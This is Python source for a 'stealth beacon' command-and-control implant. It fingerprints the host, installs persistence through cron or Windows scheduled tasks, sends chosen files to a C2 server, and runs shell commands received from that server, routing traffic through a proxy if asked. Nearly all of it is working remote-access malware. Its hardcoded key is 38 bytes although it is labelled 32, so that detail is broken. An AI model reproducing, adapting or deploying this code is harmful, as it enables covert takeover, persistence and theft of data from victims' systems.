#!/usr/bin/env python3
# REDoT Enhanced Stealth Beacon Agent

import os
import sys
import time
import json
import uuid
import base64
import socket
import argparse
import platform
import subprocess
import requests
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Hash import HMAC, SHA256

# === CONFIG ===
C2_URL = "https://your-c2-server.com/beacon"
ENCRYPTION_KEY = b'ThisIsA32ByteEncryptionKey--ABC1234567'  # 32 bytes for AES-256
KILL_SWITCH = "/tmp/redot_kill"
CONFIG_FILE = Path("loot/agent_config.json")
AGENT_LOG = Path("loot/agents.json")
BEACON_INTERVAL = 30

# === ARGUMENTS ===
parser = argparse.ArgumentParser(description="REDoT Stealth Beacon Agent")
parser.add_argument("--interval", type=int, default=BEACON_INTERVAL, help="Beacon interval (s)")
parser.add_argument("--exfil", help="File to exfiltrate")
parser.add_argument("--proxy", help="HTTP/SOCKS proxy (e.g. socks5h://127.0.0.1:9050)")
parser.add_argument("--persist", action="store_true", help="Install persistence")
args = parser.parse_args()

# === SESSION ===
session = requests.Session()
if args.proxy:
    session.proxies = {'http': args.proxy, 'https': args.proxy}

# === ENCRYPTION ===
def encrypt(data):
    data = data.encode()
    iv = get_random_bytes(12)
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    packet = iv + tag + ciphertext
    return base64.b64encode(packet).decode()

def decrypt(data_b64):
    raw = base64.b64decode(data_b64)
    iv, tag, ciphertext = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=iv)
    try:
        return cipher.decrypt_and_verify(ciphertext, tag).decode()
    except Exception:
        return "[!] Decryption failed"

# === SYSTEM FINGERPRINT ===
def get_fingerprint():
    return {
        "id": str(uuid.uuid4()),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "mac": get_mac(),
        "user": os.getenv("USER") or os.getenv("USERNAME"),
        "os": platform.system(),
        "pid": os.getpid(),
        "timestamp": datetime.now().isoformat()
    }

def get_mac():
    try:
        iface = os.popen("ip link | awk '/ether/ {print $2; exit}'").read().strip()
        return iface
    except:
        return "unknown"

# === PERSISTENCE ===
def install_persistence():
    try:
        path = os.path.abspath(__file__)
        if platform.system() == "Linux":
            cron = f"@reboot python3 {path} --interval {args.interval} &"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
        elif platform.system() == "Windows":
            task_name = "RedOT_Agent"
            os.system(f'schtasks /Create /TN {task_name} /TR "{sys.executable} {path}" /SC ONLOGON /RL HIGHEST /F')
        log("Persistence installed.")
    except Exception as e:
        log(f"Persistence failed: {e}")

# === KILL SWITCH ===
def is_killed():
    return Path(KILL_SWITCH).exists()

# === EXFILTRATION ===
def exfil_file(path):
    try:
        with open(path, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        payload = {
            "agent": socket.gethostname(),
            "type": "exfil",
            "filename": os.path.basename(path),
            "content": content
        }
        session.post(C2_URL, json=payload, timeout=10)
        log(f"File exfiltrated: {path}")
    except Exception as e:
        log(f"[!] Exfil failed: {e}")

# === LOGGING ===
def log(msg):
    print(f"[{datetime.now().isoformat()}] {msg}")

def dashboard_log(fingerprint):
    AGENT_LOG.parent.mkdir(parents=True, exist_ok=True)
    data = []
    if AGENT_LOG.exists():
        try:
            data = json.loads(AGENT_LOG.read_text())
        except:
            pass
    data.append(fingerprint)
    AGENT_LOG.write_text(json.dumps(data, indent=2))

# === COMMAND EXECUTION ===
def get_remote_command():
    try:
        res = session.get(f"{C2_URL}/cmd", timeout=10)
        if res.ok and res.text.strip():
            return decrypt(res.text.strip())
    except:
        return None

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=20)
        return result.decode()
    except Exception as e:
        return str(e)

# === MAIN LOOP ===
if args.persist:
    install_persistence()

if args.exfil:
    exfil_file(args.exfil)

fingerprint = get_fingerprint()
dashboard_log(fingerprint)

print("[*] REDoT Stealth Agent active.")

while True:
    if is_killed():
        log("[!] Kill switch engaged.")
        break

    beacon_data = json.dumps(fingerprint)
    enc_beacon = encrypt(beacon_data)
    try:
        session.post(C2_URL, data={"beacon": enc_beacon}, timeout=10)
    except Exception:
        pass

    cmd = get_remote_command()
    if cmd:
        output = execute_command(cmd)
        try:
            session.post(C2_URL, data={"agent": fingerprint["hostname"], "output": encrypt(output)}, timeout=10)
        except:
            pass

    time.sleep(args.interval)
